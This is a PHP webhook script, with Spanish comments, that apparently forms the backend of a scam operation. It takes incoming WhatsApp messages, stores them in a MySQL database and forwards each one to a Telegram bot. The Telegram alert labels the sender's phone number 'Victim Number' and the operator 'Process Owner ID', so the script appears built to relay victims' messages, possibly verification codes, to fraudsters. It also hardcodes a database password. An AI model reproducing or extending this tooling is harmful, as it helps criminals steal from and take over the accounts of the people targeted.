<?php
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST');
header('Access-Control-Allow-Headers: Content-Type');

ini_set('display_errors', 0);
ini_set('log_errors', 1);
error_reporting(E_ALL);

$logFile = 'whatsapp_processing.log';

/**
 * Función de logging mejorada.
 * Registra mensajes con fecha, hora y nivel (INFO, DEBUG, ERROR).
 *
 * @param string $level Nivel del mensaje
 * @param string $message Mensaje a registrar
 */
function writeLog($level, $message) {
    global $logFile;
    $timestamp = date('Y-m-d H:i:s');
    $logEntry = "[$timestamp][$level] " . trim($message) . PHP_EOL;
    file_put_contents($logFile, $logEntry, FILE_APPEND | LOCK_EX);
}

try {
    writeLog("INFO", "====== INICIO DE PROCESO ======");

    // Validar método HTTP
    if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
        http_response_code(405);
        writeLog("ERROR", "Método no permitido: " . $_SERVER['REQUEST_METHOD']);
        throw new Exception("Método no permitido");
    }

    // Leer y registrar datos crudos de la solicitud
    $rawInput = file_get_contents('php://input');
    writeLog("DEBUG", "Datos crudos recibidos: " . ($rawInput ?: "[Vacío]"));

    if (!$rawInput) {
        http_response_code(400);
        writeLog("ERROR", "Cuerpo de solicitud vacío");
        throw new Exception("Cuerpo de solicitud vacío");
    }

    // Decodificar y validar JSON
    $data = json_decode($rawInput, true);
    if (json_last_error() !== JSON_ERROR_NONE) {
        $jsonError = json_last_error_msg();
        http_response_code(400);
        writeLog("ERROR", "JSON inválido: $jsonError");
        throw new Exception("JSON inválido: $jsonError");
    }
    writeLog("INFO", "JSON decodificado correctamente");

    // Validar campos requeridos
    $requiredFields = ['clientId', 'message'];
    foreach ($requiredFields as $field) {
        if (empty($data[$field])) {
            http_response_code(400);
            writeLog("ERROR", "Campo requerido faltante: $field");
            throw new Exception("Campo requerido faltante: $field");
        }
    }
    writeLog("INFO", "Campos requeridos validados: " . implode(", ", $requiredFields));

    // Procesar y sanitizar datos
    $phoneNumber = filter_var($data['clientId'], FILTER_SANITIZE_STRING);

    // Si "message" es un array u objeto, acceder a su contenido
    if (is_array($data['message'])) {
        $rawMessage = $data['message']['message'] ?? '';
    } else {
        $rawMessage = $data['message'];
    }
    // Si rawMessage es un array, convertirlo a JSON
    if (is_array($rawMessage)) {
        $rawMessage = json_encode($rawMessage);
    }

    writeLog("INFO", "Número procesado: $phoneNumber");
    writeLog("INFO", "Contenido del mensaje: " . ($rawMessage ?: "[Mensaje vacío]"));

    // Configuración de la base de datos
    $dbHost = "localhost";
    $dbName = "fazoffs2_db";
    $dbUser = "fazoffs2_user";
    $dbPass = "CxzDsaEwq32!";

    writeLog("DEBUG", "Conectando a la BD en host $dbHost");
    $pdo = new PDO(
        "mysql:host={$dbHost};dbname={$dbName};charset=utf8",
        $dbUser,
        $dbPass,
        [
            PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
            PDO::ATTR_EMULATE_PREPARES => false
        ]
    );
    writeLog("INFO", "Conexión a la BD establecida correctamente");

    // Paso 1: Obtener user_id desde whatsapp_sms
    $query1 = "SELECT user_id FROM whatsapp_sms WHERE phone_number = :phoneNumber ORDER BY created DESC LIMIT 1";
    writeLog("DEBUG", "Ejecutando consulta: $query1 con parámetro phoneNumber=$phoneNumber");
    $stmt = $pdo->prepare($query1);
    $stmt->bindParam(':phoneNumber', $phoneNumber, PDO::PARAM_STR);
    $stmt->execute();
    $userid = $stmt->fetchColumn();

    if (!$userid) {
        http_response_code(404);
        writeLog("ERROR", "Relación no encontrada para el número: $phoneNumber");
        throw new Exception("Relación no encontrada para el número: $phoneNumber");
    }
    writeLog("INFO", "Client ID obtenido: $userid");

    // Paso 2: Obtener chat_id desde users
    $query2 = "SELECT chat_id FROM users WHERE id = :userid LIMIT 1";
    writeLog("DEBUG", "Ejecutando consulta: $query2 con parámetro userid=$userid");
    $stmt = $pdo->prepare($query2);
    $stmt->bindParam(':userid', $userid, PDO::PARAM_INT);
    $stmt->execute();
    $chatId = $stmt->fetchColumn();

    if (!$chatId) {
        http_response_code(404);
        writeLog("ERROR", "Usuario sin chat_id registrado: $userid");
        throw new Exception("Usuario sin chat_id registrado: $userid");
    }
    writeLog("INFO", "Chat ID obtenido: $chatId");

    // Paso 3: Formatear el mensaje con la fecha actual
    $formattedMessage = '/[' . date('Y-m-d H:i:s') . '] ' . $rawMessage;
    writeLog("DEBUG", "Mensaje formateado para actualización: $formattedMessage");

    // Actualizar el registro en la BD
    $updateQuery = "
        UPDATE whatsapp_sms 
        SET response = CONCAT(
                COALESCE(response, ''), 
                '\n', 
                :message
            ),
            sms_status = 'processed'
        WHERE phone_number = :phoneNumber
    ";
    writeLog("DEBUG", "Ejecutando consulta UPDATE: $updateQuery con parámetros phoneNumber=$phoneNumber y message=$formattedMessage");
    $stmt = $pdo->prepare($updateQuery);
    $stmt->execute([
        ':message' => $formattedMessage,
        ':phoneNumber' => $phoneNumber
    ]);
    $affectedRows = $stmt->rowCount();
    writeLog("INFO", "Registros actualizados en BD: $affectedRows");

    // Paso 4: Obtener token del bot de Telegram
    $queryToken = "SELECT user_telegram_bot FROM settings LIMIT 1";
    writeLog("DEBUG", "Ejecutando consulta para token: $queryToken");
    $botToken = $pdo->query($queryToken)->fetchColumn();
    if (!$botToken) {
        writeLog("ERROR", "Configuración de Telegram incompleta");
        throw new Exception("Configuración de Telegram incompleta");
    }
    writeLog("INFO", "Token del bot obtenido");

    // Paso 5: Enviar notificación a Telegram mediante POST usando cURL
    $telegramMessage = sprintf(
        "🌟 *New Message Received on WhatsApp Server*\n\n" .
        "━━━━━━━━━━━━━━━━━━━━━━\n" .
        "🔑 *Victim Number:* `%s`\n" .
        "━━━━━━━━━━━━━━━━━━━━━━\n" .
        "🧑‍💻 *Process Owner ID:* `%d`\n" .
        "━━━━━━━━━━━━━━━━━━━━━━\n" .
        "💬 *Message:* \n```%s```\n" .
        "━━━━━━━━━━━━━━━━━━━━━━\n" .
        "⏰ *Reception Time:* %s\n" .
        "━━━━━━━━━━━━━━━━━━━━━━",
        $phoneNumber,
        $userid,
        htmlspecialchars($rawMessage),
        date('Y-m-d H:i:s')
    );
    $telegramUrl = "https://api.telegram.org/bot{$botToken}/sendMessage";
    $postData = [
        'chat_id'    => $chatId,
        'text'       => $telegramMessage,
        'parse_mode' => 'Markdown'
    ];

    writeLog("DEBUG", "Enviando notificación a Telegram vía cURL a URL: $telegramUrl con datos: " . json_encode($postData));

    $ch = curl_init($telegramUrl);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($postData));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $telegramResponse = curl_exec($ch);
    if (curl_errno($ch)) {
        writeLog("ERROR", "cURL error: " . curl_error($ch));
    }
    curl_close($ch);
    writeLog("INFO", "Notificación enviada a Telegram: " . ($telegramResponse ?: "[Sin respuesta]"));

    // Respuesta exitosa
    $response = [
        'status'         => 'success',
        'phone'          => $phoneNumber,
        'user_id'        => $userid,
        'rows_updated'   => $affectedRows,
        'telegram_status'=> ($telegramResponse !== false)
    ];
    echo json_encode($response);
    writeLog("INFO", "Respuesta enviada: " . json_encode($response));
    writeLog("INFO", "====== PROCESO COMPLETADO ======");

} catch (PDOException $e) {
    $errorMsg = "Error BD: " . $e->getMessage();
    http_response_code(500);
    echo json_encode(['status' => 'error', 'message' => $errorMsg]);
    writeLog("ERROR", $errorMsg);
} catch (Exception $e) {
    $errorCode = $e->getCode() ?: 500;
    http_response_code($errorCode);
    echo json_encode(['status' => 'error', 'message' => $e->getMessage()]);
    writeLog("ERROR", "ERROR ({$errorCode}): " . $e->getMessage());
}
?>
